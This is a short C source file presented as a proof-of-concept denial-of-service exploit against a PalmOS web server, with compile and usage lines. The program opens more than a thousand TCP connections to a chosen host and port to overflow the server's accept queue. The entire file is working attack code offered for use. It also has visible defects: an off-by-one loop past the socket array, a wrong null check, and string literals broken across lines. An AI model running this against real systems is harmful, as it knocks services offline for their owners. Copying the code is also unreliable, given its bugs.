---palmslam.c
/* PalmOS httpd accept queue overflow PoC exploit.
 * Compile: gcc palmslam.c -o palmslam
 *
 * -shaun2k2
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#define MAX_CON 1025
int main(int argc, char *argv[]) {
        if(argc < 3) {
                printf("Usage: palmslam <host>
<port>\n");
                exit(-1);
        }

        int sock[MAX_CON];
        int i;
        struct sockaddr_in dest[MAX_CON];
        struct hostent *host;
        if((host = gethostbyname(argv[1])) == -1) {
                printf("Couldn't resolve %s!\n",
argv[1]);
                exit(-1);
        }

        for(i = 0; i <= MAX_CON; i++) {
                if((sock[i] = socket(AF_INET,
SOCK_STREAM, 0)) == -1) {
                        printf("Couldn't create
socket!\n");
                        exit(-1);
                }

                dest[i].sin_family = AF_INET;
                dest[i].sin_port =
htons(atoi(argv[2]));
                dest[i].sin_addr = *((struct in_addr
*)host->h_addr);

                if(connect(sock[i], (struct sockaddr
*)&dest[i], sizeof(struct sockaddr)) == -1) {
                        printf("Couldn't connect to %s
on port %s!\n", argv[1], argv[2]);
                        exit(-1);
                }

                printf("%d : Connected!\n", i);
        }
        return(0);
}
